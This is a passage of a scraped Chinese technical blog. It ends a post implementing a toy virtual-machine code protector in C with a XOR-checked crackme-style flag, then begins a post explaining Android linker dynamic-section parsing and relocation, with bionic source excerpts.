jnz ERROR    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, input[2]</span></span><br><span class="line"><span class="comment">        xor r1, r2</span></span><br><span class="line"><span class="comment">        cmp r1, flag[2]</span></span><br><span class="line"><span class="comment">        jnz ERROR    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, input[3]</span></span><br><span class="line"><span class="comment">        xor r1, r2</span></span><br><span class="line"><span class="comment">        cmp r1, flag[3]</span></span><br><span class="line"><span class="comment">        jnz ERROR    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, input[4]</span></span><br><span class="line"><span class="comment">        xor r1, r2</span></span><br><span class="line"><span class="comment">        cmp r1, flag[4]</span></span><br><span class="line"><span class="comment">        jnz ERROR    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, input[5]</span></span><br><span class="line"><span class="comment">        xor r1, r2</span></span><br><span class="line"><span class="comment">        cmp r1, flag[5]</span></span><br><span class="line"><span class="comment">        jnz ERROR    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, input[6]</span></span><br><span class="line"><span class="comment">        xor r1, r2</span></span><br><span class="line"><span class="comment">        cmp r1, flag[6]</span></span><br><span class="line"><span class="comment">        jnz ERROR    </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, input[7]</span></span><br><span class="line"><span class="comment">        xor r1, r2</span></span><br><span class="line"><span class="comment">        cmp r1, flag[7]</span></span><br><span class="line"><span class="comment">        jnz ERROR</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        mov r1, 0x30</span></span><br><span class="line"><span class="comment">        mov r2, 0x09</span></span><br><span class="line"><span class="comment">        call vm_write</span></span><br><span class="line"><span class="comment">        ret</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">     ERROR:</span></span><br><span class="line"><span class="comment">        mov r1, 0x40</span></span><br><span class="line"><span class="comment">        mov r2, 0x07</span></span><br><span class="line"><span class="comment">        call vm_write</span></span><br><span class="line"><span class="comment">        ret</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// xor指令解释函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_xor</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 异或的两个数分别存放在r1, r2寄存器中</span></span><br><span class="line">    <span class="keyword">int</span> arg1 = proc-&gt;r1;</span><br><span class="line">    <span class="keyword">int</span> arg2 = proc-&gt;r2;</span><br><span class="line">    <span class="comment">// 异或结果存在r1中</span></span><br><span class="line">    proc-&gt;r1 = arg1 ^ arg2;</span><br><span class="line">    <span class="comment">// xor指令只占一个字节，解释后，eip后移一个字节</span></span><br><span class="line">    proc-&gt;eip += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// cmp指令解释函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_cmp</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 比较的两个数据分别存放在r1和buffer中</span></span><br><span class="line">    <span class="keyword">int</span> arg1 = proc-&gt;r1;</span><br><span class="line">    <span class="comment">// 字节码中包含了buffer的偏移</span></span><br><span class="line">    <span class="keyword">char</span> *arg2 = *(proc-&gt;eip + <span class="number">1</span>) + heap_buf;</span><br><span class="line">    <span class="comment">// 比较并对flag寄存器置位，1为相等，0为不等</span></span><br><span class="line">    <span class="keyword">if</span> (arg1 == *arg2) &#123;</span><br><span class="line">        proc-&gt;flag = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        proc-&gt;flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// cmp指令占两个字节，eip向后移动2个字节</span></span><br><span class="line">    proc-&gt;eip += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jnz指令解释函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_jnz</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取字节码中需要的地址相距eip当前地址的偏移</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> arg1 = *(proc-&gt;eip + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 通过比较flag的值来判断之前指令的结果，如果flag为零说明之前指令不想等，jnz跳转实现</span></span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;flag == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 跳转可以直接修改eip，偏移就是上面获取到的偏移</span></span><br><span class="line">        proc-&gt;eip += arg1;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        proc-&gt;flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// jnz指令占2个字节，所以eip向后移动两个字节</span></span><br><span class="line">    proc-&gt;eip += <span class="number">2</span>;</span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">// ret指令解释函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_ret</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// read系统调用解释函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_read</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// read系统调用有两个参数，分别存放在r1,r2寄存器中，r1中是保存读入数据的buf的偏移，r2为希望读入的长度</span></span><br><span class="line">    <span class="keyword">char</span> *arg2 = heap_buf + proc-&gt;r1;</span><br><span class="line">    <span class="keyword">int</span> arg3 = proc-&gt;r2;</span><br><span class="line">    <span class="comment">// 直接调用read</span></span><br><span class="line">    read(<span class="number">0</span>, arg2, arg3);</span><br><span class="line">    <span class="comment">// read系统调用占1个字节，所以eip向后移动1个字节</span></span><br><span class="line">    proc-&gt;eip += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write 系统调用解释函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_write</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 与read系统调用相同，r1中是保存写出数据的buf的偏移，r2为希望写出的长度</span></span><br><span class="line">    <span class="keyword">char</span> *arg2 = heap_buf + proc-&gt;r1;</span><br><span class="line">    <span class="keyword">int</span> arg3 = proc-&gt;r2;</span><br><span class="line">    <span class="comment">// 直接调用write</span></span><br><span class="line">    write(<span class="number">1</span>, arg2, arg3);</span><br><span class="line">    <span class="comment">// write系统调用占1个字节，所以eip向后移动1个字节</span></span><br><span class="line">    proc-&gt;eip += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mov 指令解释函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_mov</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// mov 指令两个参数都隐含在字节码中了，指令标识后的第一个字节是寄存器的标识，指令标识后的第二到第五个字节是要mov的立即数，目前只实现了mov一个立即数到一个寄存器中和mov一个buffer中的内容到一个r1寄存器</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *dest = proc-&gt;eip + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> *src = (<span class="keyword">int</span> *) (proc-&gt;eip + <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 前4个case分别对应r1~r4，最后一个case中，*src保存的是buffer的一个偏移，实现了把buffer中的一个字节赋值给r1</span></span><br><span class="line">    <span class="keyword">switch</span> (*dest) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">            proc-&gt;r1 = *src;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">            proc-&gt;r2 = *src;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">            proc-&gt;r3 = *src;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">            proc-&gt;r4 = *src;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">            proc-&gt;r1 = *(heap_buf + *src);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">// mov指令占6个字节，所以eip向后移动6个字节</span></span><br><span class="line">    proc-&gt;eip += <span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行字节码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exec_opcode</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 查找eip指向的正在解释的字节码对应的处理函数</span></span><br><span class="line">    <span class="keyword">while</span> (!flag &amp;&amp; i &lt; OPCODE_NUM) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*proc-&gt;eip == proc-&gt;op_table[i].opcode) &#123;</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 查找到之后，调用本条指令的处理函数，由处理函数来解释</span></span><br><span class="line">            proc-&gt;op_table[i].func((<span class="keyword">void</span> *)proc);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 虚拟机的解释器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_interp</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* eip指向被保护代码的第一个字节</span></span><br><span class="line"><span class="comment">     * target_func + 4是为了跳过编译器生成的函数入口的代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    proc-&gt;eip = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *) target_func + <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// 循环判断eip指向的字节码是否为返回指令，如果不是就调用exec_opcode来解释执行</span></span><br><span class="line">    <span class="keyword">while</span> (*proc-&gt;eip != RET) &#123;</span><br><span class="line">        exec_opcode(proc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 初始化虚拟机处理器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_vm_proc</span><span class="params">(vm_processor *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    proc-&gt;r1 = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;r2 = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;r3 = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;r4 = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;flag = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 把指令字节码与解释函数关联起来</span></span><br><span class="line">    proc-&gt;op_table[<span class="number">0</span>].opcode = MOV;</span><br><span class="line">    proc-&gt;op_table[<span class="number">0</span>].func = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *)) vm_mov;</span><br><span class="line">    </span><br><span class="line">    proc-&gt;op_table[<span class="number">1</span>].opcode = XOR;</span><br><span class="line">    proc-&gt;op_table[<span class="number">1</span>].func = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *)) vm_xor;</span><br><span class="line"></span><br><span class="line">    proc-&gt;op_table[<span class="number">2</span>].opcode = CMP;</span><br><span class="line">    proc-&gt;op_table[<span class="number">2</span>].func = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *)) vm_cmp;</span><br><span class="line"></span><br><span class="line">    proc-&gt;op_table[<span class="number">3</span>].opcode = SYS_READ;</span><br><span class="line">    proc-&gt;op_table[<span class="number">3</span>].func = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *)) vm_read;</span><br><span class="line"></span><br><span class="line">    proc-&gt;op_table[<span class="number">4</span>].opcode = SYS_WRITE;</span><br><span class="line">    proc-&gt;op_table[<span class="number">4</span>].func = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *)) vm_write;</span><br><span class="line"></span><br><span class="line">    proc-&gt;op_table[<span class="number">5</span>].opcode = RET;</span><br><span class="line">    proc-&gt;op_table[<span class="number">5</span>].func = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *)) vm_ret;</span><br><span class="line"></span><br><span class="line">    proc-&gt;op_table[<span class="number">6</span>].opcode = JNZ;</span><br><span class="line">    proc-&gt;op_table[<span class="number">6</span>].func = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *)) vm_jnz;</span><br><span class="line">    <span class="comment">// 创建buffer</span></span><br><span class="line">    heap_buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(HEAP_SIZE_MAX);</span><br><span class="line">    <span class="comment">// 初始化buffer</span></span><br><span class="line">    <span class="built_in">memcpy</span>(heap_buf + <span class="number">0x20</span>, <span class="string">&quot;syclover&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(heap_buf + <span class="number">0x30</span>, <span class="string">&quot;success!\n&quot;</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(heap_buf + <span class="number">0x40</span>, <span class="string">&quot;error!\n&quot;</span>, <span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag: ZPJEF_L[</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vm_processor proc = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// initial vm processor</span></span><br><span class="line">    init_vm_proc(&amp;proc);</span><br><span class="line">    <span class="comment">// execute target func</span></span><br><span class="line">    vm_interp(&amp;proc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="虚拟机保护效果"><a href="#虚拟机保护效果" class="headerlink" title="虚拟机保护效果"></a>虚拟机保护效果</h2><p>我的运行环境是Ubuntu16.04 x64，运行结果如下：<br><img src="/images/packed/result.png"><br>用IDA打开的结果如下：<br><img src="/images/packed/target_func.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只是对虚拟机代码保护的原理进行介绍，实际应用中不会这么简单，比如，需要考虑如何将native指令替换为自定义字节码等。想要深入学习虚拟化技术还是非常复杂的。很多国外的文章中还提到过一种基于LLVM-IR的虚拟机保护，有机会要继续学习一下。<br><strong>reference</strong><br>动手实现代码虚拟机</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/07/03/Android-Linker%EF%BC%88%E4%BA%8C%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/07/03/Android-Linker%EF%BC%88%E4%BA%8C%EF%BC%89/" class="post-title-link" itemprop="url">Android Linker（二）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-07-03 23:52:23" itemprop="dateCreated datePublished" datetime="2017-07-03T23:52:23+08:00">2017-07-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="so链接"><a href="#so链接" class="headerlink" title="so链接"></a>so链接</h2><p>链接过程由<a target="_blank" rel="noopener" href="http://androidxref.com/5.0.0_r2/xref/bionic/linker/linker.cpp#soinfo_link_image">soinfo_link_image</a>函数完成，主要可以分为四个主要步骤:<br>1.<strong>定位dynamic section</strong> 由函数<code>phdr_table_get_dynamic_section</code>完成，该函数会遍历program header，找到为类型为<code>PT_DYNAMIC</code>的header, 从中获取的是dynamic section的信息，主要就是虚拟地址和项数。<br>2.<strong>解析dynamic section</strong> dynamic section本质上是类型为<code>Elf32_Dyn</code>的数组，Elf32_Dyn结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;      <span class="comment">/* 类型(例如，DT_SYMTAB)，决定d_un表示的意义*/</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word  d_val;  <span class="comment">/* 根据d_tag的不同，有不同的意义 */</span></span><br><span class="line">        Elf32_Addr  d_ptr;  <span class="comment">/* 虚拟地址 */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
<p><code>Elf32_Dyn</code>结构的<code>d_tag</code>属性表示该项的类型，类型决定了<code>d_un</code>中信息的意义，例如，当<code>d_tag = DT_SYMTAB</code>表示该项存储的是符号表的信息，<code>d_un.d_ptr</code>表示符号表的虚拟地址的偏移，当<code>d_tag = DT_RELSZ</code>时，<code>d_un.d_val</code>表示重定位表rel的项数。<br>解析的过程就是遍历数组中的每一项，根据<code>d_tag</code>的不同，获取到不同的信息。<br>dynamic section中包含的信息主要包括以下3类:<br>（1）符号信息<br>（2）重定位信息<br>（3）init&amp;finit funcs<br>3.<strong>加载needed so</strong> 调用<code>find_library</code>获取所有依赖的so的soinfo指针，如果so还没有加载，则会将so加载到内存，分配一个<code>soinfo*[]</code>指针数组，用于存放soinfo指针。<br>4.<strong>重定位</strong> 重定位so链接中最复杂同时也是最关键的一步。重定位做的工作主要是修复导入符号的引用，下面一节将对重定位过程进行详细分析。<br><code>soinfo_link_image</code>的示意代码:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">soinfo_link_image</span><span class="params">(soinfo* si, <span class="keyword">const</span> Android_dlextinfo* extinfo)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 1.获取dynamic section的信息，si-&gt;dynamic指向dynamic section</span></span><br><span class="line">    phdr_table_get_dynamic_section(phdr, phnum, base, &amp;si-&gt;dynamic,</span><br><span class="line">                                   &amp;dynamic_count, &amp;dynamic_flags);</span><br><span class="line">    <span class="comment">// 2.解析dynamic section</span></span><br><span class="line">    <span class="keyword">uint32_t</span> needed_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (ElfW(Dyn)* d = si-&gt;dynamic; d-&gt;d_tag != DT_NULL; ++d) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (d-&gt;d_tag) &#123;</span><br><span class="line">        <span class="comment">// 以下为符号信息</span></span><br><span class="line">        <span class="keyword">case</span> DT_HASH:</span><br><span class="line">            si-&gt;nbucket = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint32_t</span>*&gt;(base + d-&gt;d_un.d_ptr)[<span class="number">0</span>];</span><br><span class="line">            si-&gt;nchain = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint32_t</span>*&gt;(base + d-&gt;d_un.d_ptr)[<span class="number">1</span>];</span><br><span class="line">            si-&gt;bucket = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint32_t</span>*&gt;(base + d-&gt;d_un.d_ptr + <span class="number">8</span>);</span><br><span class="line">            si-&gt;chain = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint32_t</span>*&gt;(base + d-&gt;d_un.d_ptr + <span class="number">8</span> + si-&gt;nbucket * <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DT_SYMTAB:</span><br><span class="line">            si-&gt;symtab = <span class="keyword">reinterpret_cast</span>&lt;ElfW(Sym)*&gt;(base + d-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DT_STRTAB:</span><br><span class="line">            si-&gt;strtab = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(base + d-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 以下为重定位信息</span></span><br><span class="line">        <span class="keyword">case</span> DT_JMPREL:</span><br><span class="line">            si-&gt;plt_rel = <span class="keyword">reinterpret_cast</span>&lt;ElfW(Rel)*&gt;(base + d-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DT_PLTRELSZ:</span><br><span class="line">            si-&gt;plt_rel_count = d-&gt;d_un.d_val / <span class="keyword">sizeof</span>(ElfW(Rel));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DT_REL:</span><br><span class="line">            si-&gt;rel = <span class="keyword">reinterpret_cast</span>&lt;ElfW(Rel)*&gt;(base + d-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DT_RELSZ:</span><br><span class="line">            si-&gt;rel_count = d-&gt;d_un.d_val / <span class="keyword">sizeof</span>(ElfW(Rel));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 以下为 init&amp;finit funcs</span></span><br><span class="line">        <span class="keyword">case</span> DT_INIT:</span><br><span class="line">            si-&gt;init_func = <span class="keyword">reinterpret_cast</span>&lt;Linker_function_t&gt;(base + d-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DT_FINI:</span><br><span class="line">            ...</span><br><span class="line">        <span class="keyword">case</span> DT_INIT_ARRAY:</span><br><span class="line">            si-&gt;init_array = <span class="keyword">reinterpret_cast</span>&lt;Linker_function_t*&gt;(base + d-&gt;d_un.d_ptr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DT_INIT_ARRAYSZ:</span><br><span class="line">            ...</span><br><span class="line">        <span class="keyword">case</span> DT_FINI_ARRAY:</span><br><span class="line">            ...</span><br><span class="line">        <span class="keyword">case</span> DT_FINI_ARRAYSZ:</span><br><span class="line">            ...</span><br><span class="line">        <span class="comment">// so依赖</span></span><br><span class="line">        <span class="keyword">case</span> DT_NEEDED:</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.加载依赖的so</span></span><br><span class="line">    <span class="keyword">for</span> (ElfW(Dyn)* d = si-&gt;dynamic; d-&gt;d_tag != DT_NULL; ++d) &#123;</span><br><span class="line">        <span class="keyword">if</span> (d-&gt;d_tag == DT_NEEDED) &#123;</span><br><span class="line">            soinfo* lsi = find_library(library_name, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            si-&gt;add_child(lsi);</span><br><span class="line">            *pneeded++ = lsi;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *pneeded = <span class="literal">NULL</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 4.重定位</span></span><br><span class="line">    soinfo_relocate(si, si-&gt;plt_rel, si-&gt;plt_rel_count, needed);</span><br><span class="line">    soinfo_relocate(si, si-&gt;rel, si-&gt;rel_count, needed);</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 设置已链接标志</span></span><br><span class="line">    si-&gt;flags |= FLAG_LINKED;</span><br><span class="line">    DEBUG(<span class="string">&quot;[ finished linking %s ]&quot;</span>, si-&gt;name);</span><br><span class="line">｝</span><br></pre></td></tr></table></figure>

<h3 id="重定位relocate"><a href="#重定位relocate" class="headerlink" title="重定位relocate"></a>重定位relocate</h3><p>Android ARM下需要处理两个重定位表，<code>plt_rel</code>和<code>rel</code>，<code>plt</code>指的是延迟绑定，但是Android目前并不对延迟绑定做特殊处理，直接与普通的重定位同时处理。两个重定位的表都由<a target="_blank" rel="noopener" href="http://androidxref.com/5.0.0_r2/xref/bionic/linker/linker.cpp#1199">soinfo_relocate</a>函数处理。<br><code>soinfo_relocate</code>函数需要遍历重定位表，处理每个重定位项，每个重定位项的处理过程可已分为4步:<br>1.<strong>解析重定位项和导入符号的信息</strong><br>重定位项的结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">     Elf32_Addr  r_offset;   <span class="comment">/* 需要重定位的位置的偏移 */</span></span><br><span class="line">     Elf32_Word  r_info;     <span class="comment">/* 高24位为符号在符号表中的index，低8位为重定位类型 */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
<p>首先从重定位项获取的信息如下:<br>（1）重定位的类型type<br>（2）符号在符号表中的索引号sym，sym为0表示为本so内部的重定位，如果不为0，意味着该符号为导入符号<br>（3）重定位的目标地址reloc，使用r_offset + si_load_bias，相当于：偏移地址+基地址<br>符号表表项的结构为elf32_sym：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">elf32_sym</span> &#123;</span></span><br><span class="line">    Elf32_Word  st_name;    <span class="comment">/* 名称 – index into string table */</span></span><br><span class="line">    Elf32_Addr  st_value;   <span class="comment">/* 偏移地址 */</span></span><br><span class="line">    Elf32_Word  st_size;    <span class="comment">/* 符号长度（ 例如，函数的长度） */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_info;    <span class="comment">/* 类型和绑定类型 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   st_other;   <span class="comment">/* 未定义 */</span></span><br><span class="line">    Elf32_Half  st_shndx;   <span class="comment">/* section header的索引号，表示位于哪个section中 */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
